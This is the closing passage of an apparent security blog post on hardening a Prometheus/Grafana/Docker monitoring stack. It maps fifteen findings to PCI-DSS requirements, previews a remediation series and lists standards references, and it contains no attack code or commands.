| 1.3.2 | Outbound traffic restricted to necessary | VULN-04 |
| 1.4.1 | NSCs between trusted/untrusted networks | VULN-12 |
| 2.2.1 | Secure configuration standards maintained | VULN-01, VULN-02, VULN-03, VULN-11 |
| 2.2.2 | Vendor default accounts managed | VULN-07 |
| 2.2.5 | Unnecessary services removed | VULN-02, VULN-03 |
| 2.2.7 | Non-console admin access encrypted | VULN-10, VULN-08 |
| 4.2.1 | Strong cryptography during transmission | VULN-10, VULN-08 |
| 4.2.1.1 | Trusted key/certificate inventory | VULN-10 |
| 7.2.1 | Access control model defined | VULN-01, VULN-02, VULN-03 |
| 7.2.2 | Access assigned by job function | VULN-13 |
| 7.2.5 | Application/system account access reviewed | VULN-06 |
| 8.3.4 | Invalid auth attempts limited (max 10) | VULN-07 |
| 8.3.6 | Password complexity enforced | VULN-07 |
| 8.4.2 | MFA for CDE access | VULN-07 |
| 8.6.1 | System/application account management for interactive login | VULN-05 |
| 8.6.2 | Passwords not in scripts/config files | VULN-05 |
| 10.2.1 | Audit logs enabled and active | VULN-14 |
| 10.2.1.2 | Admin actions captured in logs | VULN-14 |
| 10.2.2 | Audit logs record required fields | VULN-14 |
| 10.3.1 | Audit log access restricted | VULN-14 |
| 10.3.3 | Logs backed up to central server | VULN-14 |
| 10.5.1 | 12-month log retention | VULN-14 |
| 12.10.1 | Incident response plan exists | VULN-15 |

---

## What Comes Next

Every vulnerability documented here has a concrete remediation. The companion post walks through the phased implementation -- session hardening, HAProxy TLS termination with rate limiting, Prometheus authentication, Docker network segmentation, container capability dropping, audit logging configuration, and backup procedures. Six phases, progressively raising the security score from 6.0 to 9.8 out of 10.

A note on the security score: the 6.0-9.8 scoring is a weighted methodology developed for this series based on the severity and count of open findings. It is not an industry-standard benchmark or certification metric -- it's a narrative device to track remediation progress across phases.

OpenBAO integration -- PKI certificate automation, runtime secret injection via AppRole, and token provisioning -- gets its own dedicated series. It's a substantial deployment with its own architecture decisions and failure modes.

The tools in this stack aren't broken. They're working exactly as designed. That's the problem. Prometheus, cAdvisor, Node Exporter, and Blackbox Exporter all ship without authentication because they assume you'll deploy them behind something that provides it. A reverse proxy. A firewall rule. A VPN. Something.

Most environments don't. The monitoring stack gets deployed during a sprint, it works, dashboards light up, and everyone moves on to the next ticket. Nobody comes back to harden it because it's "just monitoring" and it's "only internal." Fifteen vulnerabilities later, "just monitoring" has given an attacker the complete infrastructure topology, cross-VLAN access, persistent admin credentials, and a clear map of everything worth hitting next.

The gap between "assumed secure because it's internal" and "actually secured" is where every one of these findings lives.

---

## References and Resources

**OWASP Testing Guide v4.2** -- The brute-force testing methodology (VULN-07), session management validation (VULN-06), and SSRF identification (VULN-04) follow OWASP's Web Security Testing Guide, specifically WSTG-ATHN-03 (Testing for Weak Lock Out Mechanism), WSTG-SESS-01 (Testing for Session Management Schema), and WSTG-INPV-19 (Testing for Server-Side Request Forgery).

**Prometheus Documentation** -- Default configuration behavior, API endpoints (`/api/v1/targets`, `/api/v1/status/config`), and the absence of built-in authentication are documented in the Prometheus Security Model and HTTP API reference.

**cAdvisor API Documentation** -- Container and machine API endpoints (`/api/v1.0/machine`, `/api/v1.0/containers/`) referenced in Google's cAdvisor repository. The systemd slice path discovery (VULN-02) was determined through experimentation when the documented `/docker` endpoint didn't work.

**Grafana Administration API** -- Service account creation, token generation, admin settings retrieval, and session configuration documented in the Grafana HTTP API reference. The deprecated `/api/auth/keys` endpoint behavior was confirmed through testing against Grafana v12.

**Node Exporter** -- Metrics exposure and host-level data collection documented in the Prometheus Node Exporter repository.

**Blackbox Exporter** -- Probe endpoint behavior and module configuration documented in the Prometheus Blackbox Exporter repository. SSRF potential through unauthenticated probe endpoints is discussed in multiple security advisories and monitoring security guides.

**CIS Docker Benchmark v1.6** -- Container capability assessment, network segmentation checks, and secret storage validation (VULNs 05, 11, 12) follow the CIS Docker Benchmark. Specific recommendations referenced: 4.10, 5.3, 5.4, 5.10, 5.13, 5.26, 5.30.

**NIST SP 800-53 Rev 5** -- Control mapping throughout the assessment references NIST Special Publication 800-53 Revision 5, Security and Privacy Controls for Information Systems and Organizations.

**OWASP Secure Headers Project** -- Security header assessment (VULN-09) references the OWASP Secure Headers Project for expected headers and their security implications.

**Docker Documentation** -- Container inspection, network listing, capability management, and volume commands referenced from Docker CLI documentation. The `docker inspect` format strings for extracting security-relevant configuration follow Docker's Go template syntax.

**PCI-DSS v4.0** -- Payment Card Industry Data Security Standard version 4.0, published by the PCI Security Standards Council. Applied to monitoring infrastructure under the scope extension for system components connected to the cardholder data environment.

**SOC 2 Trust Services Criteria** -- AICPA Trust Services Criteria for Security, Availability, and Confidentiality, used for compliance mapping throughout.

---

*Published by Oob Skulden™ -- Stay Paranoid.*
